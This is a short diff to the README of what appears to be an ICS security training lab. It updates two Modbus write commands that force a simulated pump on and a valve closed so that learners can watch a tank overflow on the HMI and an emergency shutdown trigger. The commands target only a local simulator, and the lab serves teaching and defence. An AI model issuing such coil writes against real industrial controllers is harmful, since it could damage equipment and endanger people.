@@ -108,8 +108,8 @@ docker-compose --profile full up -d
 # 1. Open HMI in browser: http://localhost:8000
 # 2. Watch tank level in real-time
 # 3. Execute attack:
-modbus write localhost:5502 0 1  # Force pump on
-modbus write localhost:5502 1 0  # Force valve closed
+sudo modbus 127.0.0.1:5502 write 0 1  # Force pump on
+sudo modbus 127.0.0.1:5502 write 1 0  # Force valve closed
 # 4. Watch tank overflow on HMI!
 # 5. See emergency shutdown trigger
 ```
